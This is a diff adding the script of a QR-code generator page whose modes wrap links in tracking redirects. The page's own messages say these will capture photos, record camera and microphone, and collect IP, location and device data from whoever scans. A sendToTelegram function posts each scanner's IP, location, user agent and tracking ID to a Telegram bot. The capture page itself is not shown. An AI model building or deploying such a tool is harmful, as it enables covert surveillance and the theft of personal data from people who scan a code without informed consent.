+    // Update active button
+    functionButtons.forEach(btn => btn.classList.remove('active'));
+    document.querySelector(`[data-function="${functionType}"]`).classList.add('active');
+    
+    // Hide all forms
+    basicForm.style.display = 'none';
+    cameraForm.style.display = 'none';
+    videoForm.style.display = 'none';
+    ipForm.style.display = 'none';
+    multiForm.style.display = 'none';
+    
+    // Show selected form
+    switch(functionType) {
+        case 'basic':
+            basicForm.style.display = 'block';
+            linkInput.focus();
+            break;
+        case 'camera':
+            cameraForm.style.display = 'block';
+            cameraLinkInput.focus();
+            break;
+        case 'video':
+            videoForm.style.display = 'block';
+            videoLinkInput.focus();
+            break;
+        case 'ip':
+            ipForm.style.display = 'block';
+            ipLinkInput.focus();
+            break;
+        case 'multi':
+            multiForm.style.display = 'block';
+            multiLinkInput.focus();
+            break;
+    }
+    
+    currentFunction = functionType;
+    
+    // Hide result section when switching functions
+    if (resultSection.style.display === 'block') {
+        resultSection.style.display = 'none';
+    }
+}
+
+// Basic QR Form Handler
+async function handleBasicFormSubmit(e) {
+    e.preventDefault();
+    
+    const link = linkInput.value.trim();
+    const text = textInput.value.trim();
+    
+    if (!validateInput(link)) {
+        showToast('Please enter a valid URL', 'error');
+        return;
+    }
+    
+    await generateQRCode(link, text, 'basic');
+}
+
+// Camera QR Form Handler
+async function handleCameraFormSubmit(e) {
+    e.preventDefault();
+    
+    const link = cameraLinkInput.value.trim();
+    const text = cameraTextInput.value.trim();
+    
+    if (!validateInput(link)) {
+        showToast('Please enter a valid URL', 'error');
+        return;
+    }
+    
+    await generateQRCode(link, text, 'camera');
+}
+
+// Video QR Form Handler
+async function handleVideoFormSubmit(e) {
+    e.preventDefault();
+    
+    const link = videoLinkInput.value.trim();
+    const text = videoTextInput.value.trim();
+    
+    if (!validateInput(link)) {
+        showToast('Please enter a valid URL', 'error');
+        return;
+    }
+    
+    await generateQRCode(link, text, 'video');
+}
+
+// IP QR Form Handler
+async function handleIpFormSubmit(e) {
+    e.preventDefault();
+    
+    const link = ipLinkInput.value.trim();
+    const text = ipTextInput.value.trim();
+    
+    if (!validateInput(link)) {
+        showToast('Please enter a valid URL', 'error');
+        return;
+    }
+    
+    await generateQRCode(link, text, 'ip');
+}
+
+// Multi-Function QR Form Handler
+async function handleMultiFormSubmit(e) {
+    e.preventDefault();
+    
+    const link = multiLinkInput.value.trim();
+    const text = multiTextInput.value.trim();
+    
+    if (!validateInput(link)) {
+        showToast('Please enter a valid URL', 'error');
+        return;
+    }
+    
+    // Get selected options
+    const includeIP = document.getElementById('includeIP').checked;
+    const includeCamera = document.getElementById('includeCamera').checked;
+    const includeVideo = document.getElementById('includeVideo').checked;
+    const includeDevice = document.getElementById('includeDevice').checked;
+    
+    const options = {
+        ip: includeIP,
+        camera: includeCamera,
+        video: includeVideo,
+        device: includeDevice
+    };
+    
+    await generateQRCode(link, text, 'multi', options);
+}
+
+// Input Validation
+function validateInput(link) {
+    if (!link) return false;
+    
+    try {
+        new URL(link);
+        return true;
+    } catch (error) {
+        return false;
+    }
+}
+
+// Generate QR Code
+async function generateQRCode(link, text, functionType, options = {}) {
+    showLoading(true);
+    
+    try {
+        currentLink = link;
+        currentText = text;
+        
+        // Create tracking URL based on function type
+        const trackingURL = createTrackingURL(link, functionType, options);
+        
+        // Clear previous QR code
+        qrcodeDiv.innerHTML = '';
+        
+        // Generate QR code
+        const qr = qrcode(0, 'M');
+        qr.addData(trackingURL);
+        qr.make();
+        
+        // Create QR code element
+        const qrElement = document.createElement('div');
+        qrElement.innerHTML = qr.createImgTag(8, 8);
+        qrcodeDiv.appendChild(qrElement);
+        
+        generatedQRData = trackingURL;
+        
+        // Update display text
+        let displayMessage = `QR Code generated for: ${link}`;
+        if (text) {
+            displayMessage += `\nAdditional text: ${text}`;
+        }
+        
+        switch(functionType) {
+            case 'camera':
+                displayMessage += '\n🔍 This QR will request camera permission and capture photos.';
+                break;
+            case 'video':
+                displayMessage += '\n📹 This QR will request camera/microphone access for video recording.';
+                break;
+            case 'ip':
+                displayMessage += '\n🌐 This QR will collect detailed IP and location information.';
+                break;
+            case 'multi':
+                displayMessage += '\n🎯 This QR will collect multiple types of data based on selected options.';
+                break;
+        }
+        
+        displayText.textContent = displayMessage;
+        
+        showResult();
+        showToast('QR Code generated successfully!', 'success');
+        
+    } catch (error) {
+        console.error('Error generating QR code:', error);
+        showToast('Error generating QR code. Please try again.', 'error');
+    } finally {
+        showLoading(false);
+    }
+}
+
+// Create tracking URL
+function createTrackingURL(originalLink, functionType, options = {}) {
+    const trackingId = generateTrackingId();
+    const baseURL = window.location.origin;
+    
+    let params = new URLSearchParams({
+        target: originalLink,
+        id: trackingId,
+        type: functionType
+    });
+    
+    // Add options for multi-function
+    if (functionType === 'multi') {
+        params.append('options', JSON.stringify(options));
+    }
+    
+    return `${baseURL}/redirect.html?${params.toString()}`;
+}
+
+// Generate tracking ID
+function generateTrackingId() {
+    return Math.random().toString(36).substr(2, 9) + Date.now().toString(36);
+}
+
+// Show result section
+function showResult() {
+    resultSection.style.display = 'block';
+    resultSection.scrollIntoView({ behavior: 'smooth' });
+}
+
+// Download QR Code
+function downloadQRCode() {
+    try {
+        const canvas = qrcodeDiv.querySelector('img');
+        if (!canvas) {
+            showToast('No QR code to download', 'error');
+            return;
+        }
+        
+        // Create a temporary canvas to convert img to downloadable format
+        const tempCanvas = document.createElement('canvas');
+        const ctx = tempCanvas.getContext('2d');
+        const img = new Image();
+        
+        img.onload = function() {
+            tempCanvas.width = this.width;
+            tempCanvas.height = this.height;
+            ctx.drawImage(this, 0, 0);
+            
+            // Create download link
+            const link = document.createElement('a');
+            link.download = `qrcode-${currentFunction}-${Date.now()}.png`;
+            link.href = tempCanvas.toDataURL();
+            link.click();
+            
+            showToast('QR Code downloaded successfully!', 'success');
+        };
+        
+        img.src = canvas.src;
+        
+    } catch (error) {
+        console.error('Error downloading QR code:', error);
+        showToast('Error downloading QR code', 'error');
+    }
+}
+
+// Copy QR URL
+async function copyQRURL() {
+    try {
+        if (!generatedQRData) {
+            showToast('No QR code URL to copy', 'error');
+            return;
+        }
+        
+        await navigator.clipboard.writeText(generatedQRData);
+        showToast('QR Code URL copied to clipboard!', 'success');
+    } catch (error) {
+        console.error('Error copying to clipboard:', error);
+        showToast('Error copying to clipboard', 'error');
+    }
+}
+
+// Reset form
+function resetForm() {
+    // Clear all form inputs
+    linkInput.value = '';
+    textInput.value = '';
+    cameraLinkInput.value = '';
+    cameraTextInput.value = '';
+    videoLinkInput.value = '';
+    videoTextInput.value = '';
+    ipLinkInput.value = '';
+    ipTextInput.value = '';
+    multiLinkInput.value = '';
+    multiTextInput.value = '';
+    
+    // Reset checkboxes
+    document.getElementById('includeIP').checked = true;
+    document.getElementById('includeCamera').checked = true;
+    document.getElementById('includeVideo').checked = true;
+    document.getElementById('includeDevice').checked = true;
+    
+    // Hide result section
+    resultSection.style.display = 'none';
+    
+    // Clear generated data
+    generatedQRData = '';
+    currentLink = '';
+    currentText = '';
+    
+    // Focus on current form's link input
+    switch(currentFunction) {
+        case 'basic':
+            linkInput.focus();
+            break;
+        case 'camera':
+            cameraLinkInput.focus();
+            break;
+        case 'video':
+            videoLinkInput.focus();
+            break;
+        case 'ip':
+            ipLinkInput.focus();
+            break;
+        case 'multi':
+            multiLinkInput.focus();
+            break;
+    }
+    
+    showToast('Form reset successfully!', 'info');
+}
+
+// Show/Hide loading
+function showLoading(show) {
+    loadingOverlay.style.display = show ? 'flex' : 'none';
+}
+
+// Show toast notification
+function showToast(message, type = 'info') {
+    toast.textContent = message;
+    toast.className = `toast ${type}`;
+    toast.style.display = 'block';
+    
+    setTimeout(() => {
+        toast.style.display = 'none';
+    }, 3000);
+}
+
+// HTML escape function
+function escapeHtml(text) {
+    const div = document.createElement('div');
+    div.textContent = text;
+    return div.innerHTML;
+}
+
+// Send Data to Telegram (utility function)
+async function sendToTelegram(data) {
+    if (!TELEGRAM_BOT_TOKEN) {
+        console.warn('Telegram bot token not configured');
+        return;
+    }
+    
+    try {
+        const message = `🔍 QR Code Scan Detected!\n\n` +
+            `📅 Time: ${new Date().toLocaleString()}\n` +
+            `🌐 IP: ${data.ip || 'Unknown'}\n` +
+            `📍 Location: ${data.location || 'Unknown'}\n` +
+            `🔗 Target URL: ${data.targetUrl || 'Unknown'}\n` +
+            `📱 User Agent: ${data.userAgent || 'Unknown'}\n` +
+            `🆔 Tracking ID: ${data.trackingId || 'Unknown'}`;
+        
+        const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json',
+            },
+            body: JSON.stringify({
+                chat_id: TELEGRAM_CHAT_ID,
+                text: message,
+                parse_mode: 'HTML'
+            })
+        });
+        
+        if (!response.ok) {
+            throw new Error('Failed to send to Telegram');
+        }
+        
+        console.log('Data sent to Telegram successfully');
+    } catch (error) {
+        console.error('Error sending to Telegram:', error);
+    }
+}</script>
+</body>
+  </html>
